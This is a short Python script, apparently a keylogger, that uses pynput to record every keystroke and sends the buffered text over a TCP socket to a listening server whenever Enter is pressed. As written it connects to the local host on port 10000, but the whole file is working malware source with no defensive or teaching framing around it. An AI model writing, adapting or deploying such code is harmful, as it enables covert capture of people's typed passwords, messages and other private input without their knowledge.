import os
import socket
from pynput.keyboard import Key, Listener

# Create Socket and Connect to Host
host = socket.gethostname()
port = 10000
sock = socket.socket()
sock.connect((host,port))

# each keystroke be seperated by a line when sent to the server.
logstring="\n";
def OnPress(key):
    global logstring
    if key != Key.enter:
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                logstring += " "
            else:
                if len(logstring) > 1:
                    logstring += "\n"
                    logstring += str(key).strip("'")
                else:
                    logstring += str(key).strip("'")
                    logstring += "\n"

        else: 
            logstring += str(key).strip("'")
    else:
        sock.sendall((logstring).encode('utf-8'))
        logstring = "\n"

with Listener(on_press=OnPress) as listener :
    listener.join() 